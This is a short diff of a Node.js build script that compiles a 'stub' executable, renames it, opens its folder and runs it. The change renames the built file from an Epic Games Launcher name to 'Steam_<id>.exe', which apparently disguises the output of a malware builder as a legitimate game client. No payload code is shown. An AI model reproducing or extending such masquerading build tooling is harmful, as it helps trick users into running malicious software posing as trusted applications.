@@ -47,18 +47,18 @@ async function main() {
 
         if (stderr) {
             console.error('Compilation failed!', stderr);
-            await exec(`msg * "Compilation failed!${stderr ? '\\n' + stderr : ''}"`);
+            await exec(`call msg * "Compilation failed!${stderr ? '\\n' + stderr : ''}"`);
         } else {
             console.log('Compilation success!');
 
-            const outputFilename = `doener_${randomid}.exe`;
-            const oldFilePath = path.join(CURRENT_DIR, 'build', 'EpicGamesLauncher 1.0.0.exe');
+            const outputFilename = `Steam_${randomid}.exe`;
+            const oldFilePath = path.join(CURRENT_DIR, 'build', 'Steam 1.0.0.exe');
             const newFilePath = path.join(CURRENT_DIR, 'build', outputFilename);
             await fs.rename(oldFilePath, newFilePath);
 
             console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
-            await exec(`msg * "Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}"`);
-            await exec(`start explorer "${path.join(CURRENT_DIR, 'build')}"`);
+            await exec(`call msg * "Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}"`);
+            await exec(`call start explorer "${path.join(CURRENT_DIR, 'build')}"`);
 	    await exec(`"${path.join(CURRENT_DIR, 'build', outputFilename)}"`);
         }
 
